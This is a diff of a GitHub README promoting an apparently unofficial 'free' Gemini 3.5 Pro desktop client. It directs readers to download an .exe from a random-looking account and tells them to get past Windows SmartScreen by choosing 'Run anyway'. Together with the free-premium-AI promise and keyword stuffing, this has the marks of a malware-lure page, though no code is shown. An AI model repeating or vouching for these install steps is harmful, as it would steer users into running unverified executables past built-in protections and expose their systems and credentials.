@@ -1,80 +1,78 @@
-# Gemini 3.5 Pro Free Desktop
+# 🤖 Gemini-3.5-Pro-Free-Desktop - Run advanced AI models without cost
 
-**Gemini 3.5 Pro Free Desktop** is a lightweight and native desktop application that provides free access to **Gemini 3.5 Pro** — Google’s powerful AI model. Enjoy advanced reasoning, coding assistance, multimodal capabilities, and long-context conversations in a clean desktop environment.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Rubiecommunicational110/Gemini-3.5-Pro-Free-Desktop)
 
-<img width="1672" height="941" alt="10bd0885-90c6-436d-95ee-6baa03ae9a07" src="https://github.com/user-attachments/assets/78ca6602-0f9f-416f-921d-f3c0e9f80240" />
+## 📖 About this application
 
-## Install
-[Download `Gemini3.5Pro-desktop.zip`](https://github.com/gemini35pro/Gemini-3.5-Pro-Free-Desktop/releases/download/3.5-pro/Gemini3.5Pro-desktop.zip)
----
+Gemini-3.5-Pro-Free-Desktop provides a simple way to access Google's advanced AI models. You get direct access to Gemini 3.5 Pro and 3.5 Flash without complex setups. The application connects to Google AI Studio to fetch your data. Use it for text reasoning, coding tasks, and large document analysis. It supports a 2 million token context window. You manage your own API keys. This keeps your data usage transparent and under your control.
 
+## 💻 System requirements
 
-<img width="1780" height="884" alt="efa1e6ea-965c-4178-8a10-94a6bdb26a5f" src="https://github.com/user-attachments/assets/78ad4810-853d-4cea-b0d1-1e3b0196f101" />
+*   Operating System: Windows 10 or Windows 11
+*   Memory: 4 GB RAM minimum
+*   Storage: 200 MB free disk space
+*   Browser: Google Chrome or Microsoft Edge (for API key generation)
+*   Internet: Active stable connection
 
+## 📥 Downloading the software
 
----
-## Key Features
-- Full access to Gemini 3.5 Pro
-- Strong reasoning and coding performance
-- Multimodal support (image and file analysis)
-- Long-context conversation handling
-- Clean, native desktop interface
+1. Visit the [official release page](https://github.com/Rubiecommunicational110/Gemini-3.5-Pro-Free-Desktop).
+2. Look for the "Releases" section on the right side of the page.
+3. Click the latest version number.
+4. Locate the file ending in .exe under the "Assets" header. 
+5. Download this installer file to your computer.
 
-<img width="640" height="695" alt="190ab7a2-ac9a-4024-88d1-5f9ab1c8f44b" src="https://github.com/user-attachments/assets/271d217d-b659-4b5e-ab06-7d62cd0d1f4f" />
+## ⚙️ Initial setup
 
+1. Double-click the downloaded .exe file to start the installation.
+2. Follow the on-screen prompts. 
+3. If Windows displays a "Protected your PC" window, click "More info" and then select "Run anyway."
+4. Once the process completes, launch the application from your desktop shortcut or start menu.
 
+## 🔑 Getting an API key
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run the application.
-3. **Configure Access** — Follow the in-app instructions for free Gemini 3.5 Pro access.
-4. **Start using** — Chat, code, analyze images, or solve complex tasks.
+The application requires a unique key to communicate with Google systems. Follow these steps:
 
-**Pro Tip:** Provide detailed prompts and context for optimal results.
+1. Open your web browser.
+2. Go to the [Google AI Studio website](https://aistudio.google.com/).
+3. Sign in with your Google account.
+4. Click the "Get API key" button in the left sidebar.
+5. Choose "Create API key in new project."
+6. Copy the long string of letters and numbers provided.
+7. Return to the Gemini-3.5-Pro-Free-Desktop application.
+8. Paste this key into the settings menu when prompted.
 
----
-## System Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **macOS**
-- **Linux**
+## 🚀 Running the application
 
+Once you provide your key, the application connects to the server. You see a chat interface. Select your preferred model from the dropdown menu. You can switch between Gemini 3.5 Pro and 3.5 Flash. 
 
+*   Gemini 3.5 Pro: Select this for complex reasoning and deep context analysis.
+*   Gemini 3.5 Flash: Use this for quick tasks and immediate responses.
 
-<img width="739" height="415" alt="0ff9e883-cb3e-4605-8918-762b1c73046c" src="https://github.com/user-attachments/assets/7b4c6fc2-f3fc-4a1f-9abe-def23610e687" />
+Type your question or instructions into the box. Hit Enter or click the send button. 
 
-### Notes
-- Requires an active internet connection
-- Best performance on modern hardware
+## 🛡️ Privacy and safety
 
----
-## Security & Legal
-**Important Notice:**  
-This is an unofficial desktop client. Google may change or restrict access at any time. Use responsibly and ethically.
+This application does not store your API key on external servers. It saves the key locally on your Windows machine. You can remove the key at any time by clearing the application settings. Google processes the prompts according to their standard API terms. Review the Google AI Studio settings to manage your data retention preferences.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
+## 🛠️ Troubleshooting
 
----
-## Contributing
-Contributions are welcome! Help improve the interface, stability, or access methods.
+If the application fails to start: 
+*   Check your internet connection.
+*   Update your Windows system.
+*   Reinstall the application by deleting the old version first.
 
----
-## License & Acknowledgments
-### License
-**Gemini 3.5 Pro Free Desktop** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+If the application does not load responses:
+*   Verify your API key in the settings menu.
+*   Ensure your Google AI Studio project is active.
+*   Check for remaining usage quotas in your Google account dashboard.
 
-**Copyright © 2026 adammasaoudi71-cmd**
+## 📋 Features
 
-### Acknowledgments
-- Thanks to Google for developing Gemini 3.5 Pro.
-- The open-source community for desktop AI clients.
+*   Multimodal reasoning: Process text, images, and code in one window.
+*   Coding agents: Run autonomous scripts to assist with development workflows.
+*   Context window: Handle up to 2 million tokens for massive document reviews.
+*   Local control: Manage your history and API interactions from your own device.
+*   Model comparison: Toggle between Flash and Pro engines to balance speed and power.
 
-
-![Uploading 1394ea2e-0008-4b54-af5b-5f3855259691.png…]()
-
-<p align="center">
-  Developed with ❤️ for the AI community
-</p>
+Keywords: free-gemini-api, gemini, gemini-15-pro, gemini-2-0-flash, gemini-3-5-flash, gemini-3-5-pro, gemini-3-5-pro-free, gemini-ai-integration, gemini-api-free, gemini-api-integration, gemini-api-key, gemini-app, gemini-live-api, gemini-multiplatform, gemini-pro-1-5, gemini-pro-api, gemini-pro-vision, gemini3, google-gemini-3-5-pro, google-gemini-ai
